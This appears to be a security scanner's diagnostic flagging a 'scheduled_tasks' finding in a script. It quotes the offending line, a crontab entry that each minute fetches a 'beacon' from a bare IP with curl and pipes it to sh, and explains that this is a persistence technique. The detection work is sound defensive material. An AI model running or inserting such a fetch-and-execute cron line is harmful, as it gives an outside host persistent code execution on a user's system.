🚩 [scheduled_tasks]: installs a crontab that runs code on a schedule
 --> <stdin>:7:55
  |
7 | echo "* * * * * curl -s http://1.2.3.4/beacon | sh" | crontab -
  |                                                       ^^^^^^^^^ sensitive
  |
  = note: Scheduled jobs keep running long after the installer exits and are a common way to re-fetch a payload or hold persistence.
  = help: Confirm the tool genuinely needs a background schedule; malware uses these to survive reboots.

